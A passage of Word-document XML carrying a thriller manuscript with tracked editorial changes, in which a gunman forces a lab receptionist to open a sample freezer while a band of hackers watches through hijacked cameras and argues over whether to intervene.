          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d her to sprint back to her lobby, call the police, and get the hell out of the building. Except she couldn’t, because her eyes were now locked onto hers. </w:t>
      </w:r>
      <w:ins w:id="908" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Before </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="909" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">The only thing </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="910" w:author="TextVet" w:date="2016-03-16T15:41:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">the kaleidoscope fragments of thoughts of </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="911" w:author="TextVet" w:date="2016-03-16T15:42:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">friends, </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="912" w:author="TextVet" w:date="2016-03-16T15:41:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>family and future hopes</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="913" w:author="TextVet" w:date="2016-03-16T15:42:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="914" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>she</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="915" w:author="TextVet" w:date="2016-03-16T15:44:00Z">
        <w:r w:rsidR="00512FA5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’d never see</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="916" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> took her, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="917" w:author="TextVet" w:date="2016-03-16T15:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">she could think to do was to run </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">her receptionist </w:t>
      </w:r>
      <w:ins w:id="918" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidR="00B6666F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">voice </w:t>
        </w:r>
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="919" w:author="TextVet" w:date="2016-03-16T15:45:00Z">
        <w:r w:rsidR="00B6666F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>nquire</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="920" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidR="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>d,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="921" w:author="TextVet" w:date="2016-03-16T15:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0061737E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>program</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="922" w:author="TextVet" w:date="2016-03-16T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0061737E">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“Hi. Can I help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 replied in a foreign accent</w:t>
      </w:r>
      <w:ins w:id="923" w:author="TextVet" w:date="2016-03-16T15:45:00Z">
        <w:r w:rsidR="00966E72">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="924" w:author="TextVet" w:date="2016-03-16T15:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00966E72">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. T</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="925" w:author="TextVet" w:date="2016-03-16T15:45:00Z">
        <w:r w:rsidR="00966E72">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he same </w:t>
      </w:r>
      <w:del w:id="926" w:author="TextVet" w:date="2016-03-16T15:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00966E72">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">accent </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>as Dr. Passinsky’s: Russian. “I’m from the courier service. I’m here to pick up delivery for urgent shipment tomorrow. Has to arrive first thing in the morning.”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gazed at her like a wolf at a rabbit. Tina felt a crushing tightness in her chest. “I’m supposed to sign visitors in at the front desk,” she </w:t>
      </w:r>
      <w:del w:id="927" w:author="TextVet" w:date="2016-03-16T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00176323">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:ins w:id="928" w:author="TextVet" w:date="2016-03-16T15:46:00Z">
        <w:r w:rsidR="00176323">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ssue</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:ins w:id="929" w:author="TextVet" w:date="2016-03-16T15:46:00Z">
        <w:r w:rsidR="00176323">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tentatively.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 necessary,” said the man, his eyes boring a hole through her. “I belong here. See? I have a keycard.”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stood immobile in the doorway, forcing herself to remain calm. “Good luck with the delivery. I’ll just go back to my desk now and finish my work.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stared at her silently.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“Okay?” she repeated, trying not to sound like she was pleading.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Finally, he said,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resisted </w:t>
      </w:r>
      <w:del w:id="930" w:author="TextVet" w:date="2016-03-16T15:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0059358B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the urge </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sigh</w:t>
      </w:r>
      <w:ins w:id="931" w:author="TextVet" w:date="2016-03-16T15:47:00Z">
        <w:r w:rsidR="0059358B">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in relief. She’d pretend to believe his deliveryman story</w:t>
      </w:r>
      <w:ins w:id="932" w:author="TextVet" w:date="2016-03-16T15:47:00Z">
        <w:r w:rsidR="00A655DD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="933" w:author="TextVet" w:date="2016-03-16T15:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A655DD">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he’d pretend to believe her about believing it, and they’d both let the night proceed under this pleasant little fiction. “Okay,” she repeated with a nod, and slowly started backing out from the doorway.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what?” the man said suddenly. “I change my mind.”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a quick, soundless motion, the man reached into his jacket, pulled out a gun, and pointed it at Tina. The revolver was barely larger than his palm, but its barrel looked wide enough to stick a finger into.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“Get in here, young lady,” he commanded. With a practiced flick of his thumb, managing to keep the barrel perfectly still, he cocked the revolver’s hammer back. It made a click, a tiny sound that somehow managed to ring louder than all of the machinery in the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stepped through the doorway.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“Good girl,” he said. “Now come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backed away several feet, keeping the gun trained on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“That refrigerator,” he </w:t>
      </w:r>
      <w:ins w:id="934" w:author="TextVet" w:date="2016-03-16T15:49:00Z">
        <w:r w:rsidR="005C2426">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ordered</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="935" w:author="TextVet" w:date="2016-03-16T15:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005C2426">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said to her</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, bobbing his head at the deep-freezer. “That’s long-term storage for microbe samples,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“Open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grabbed the handle of the deep-freezer’s massive metal door and yanked. The door’s rubber gasket released its seal, letting the cryogenic air spill into the room. Standing in front of it felt like being stabbed with thousands of needle-sharp shards of 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I really am here for pickup,” the man said. “Your friend Julie — you know Julie, yes? — She left something here, that is really better left with someone else. Now, about you, I’m thinking maybe you could be useful. You want to be useful,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do you want?” Tina croaked.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“Tell me,” he said, “what the fuck is an Eppendorf tube?”</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Jason smacked the cellphone</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> out of Mike’s hand with “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>91</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” on the dialer. “No cops!”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“Look at this shit, Jason!” said Mike. “We </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to call the police!”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tell them what, exactly?” Jason replied. He stood outside the car at the open window beside Mike, his arm still stretched inside. “‘Oh, hi, me and my Dungeons and Dragons buddies were just hacking into this company, when we saw some scary stuff going on through their video feeds that we happened to hijack.’ Have you forgotten that what we’re doing here is illegal too?”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“You’re being paranoid,” said Mike.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damn good reason!” Jason insisted. “Think about how much we each have to lose if any of this gets back to us — me especially. Now look, I know you’re a bunch of talented guys, and you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>think</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> that maybe you can cover your tracks. But what if you’re wrong? Think about the kind of computer forensics experts that the cops can bring in on a case like this. They</w:t>
      </w:r>
      <w:ins w:id="936" w:author="TextVet" w:date="2016-03-16T15:51:00Z">
        <w:r w:rsidR="00F47C01">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="937" w:author="TextVet" w:date="2016-03-16T15:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F47C01">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> wi</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ll zero in on the slightest, </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="938" w:author="TextVet" w:date="2016-03-16T15:51:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>tiniest</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> little mistake you could possib</w:t>
      </w:r>
      <w:del w:id="939" w:author="TextVet" w:date="2016-03-16T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00210377">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:del w:id="940" w:author="TextVet" w:date="2016-03-16T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00210377">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y make. So let’s just let this… this whatever-is-going-on-here, let’s let it blow over, and resume the operation when everything’s nice and quiet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shook his head. “Let it ‘blow over’? But that girl in there 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“She’s not our problem,” Jason said, avoiding eye contact. “I hate to say it that bluntly, but we didn’t cause her situation, so it’s not our responsibility to get her out of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stared at the live video of the dark-haired young woman held at gunpoint. “We </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>did</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, though. We </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>did</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> cause this. This is all our fault.”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Our</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> fault, Danny?” said Jason, incredulous.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from behind them, murmured, “Our camera-spinning trick.”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gravely. “We lured her away from her desk. We separated her from her computer and her phone. We created the window of opportunity for those guys to enter the building, and we deprived her of the means to call for help. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>We</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> did this. This is on </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>us</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.” He looked back and forth between them and his screen. The girl in the video feed stood before the giant refrigerator, shivering. “God. Jason, you put </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>me</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> in charge, and I…” He shook his head vigorously, as though the motion could clear away his current reality like an Etch A Sketch doodle. “I have to Control-Z. I have to reload an earlier save… I have to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>undo</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>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“Don’t be silly, Danny,” Jason insisted. “Let’s just lay low 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No!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” The sudden strength of Danny’s voice startled them all — particularly Danny himself. He took a deep breath. “Listen, we’re still here to do a job. I think maybe… Instead of bailing, we might be able to use this situation to our advantage.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Eyebrows cocked around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guy is making Christina dig through the freezer. They’re looking for something. What we’re watching isn’t a kidnapping. They’re pulling off a robbery.”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shrugged. “And…?”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so are we,” said Danny. “The difference is, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>they</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> seem to know what they’re looking for. We’re here to steal Tungsten’s secrets, right? </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
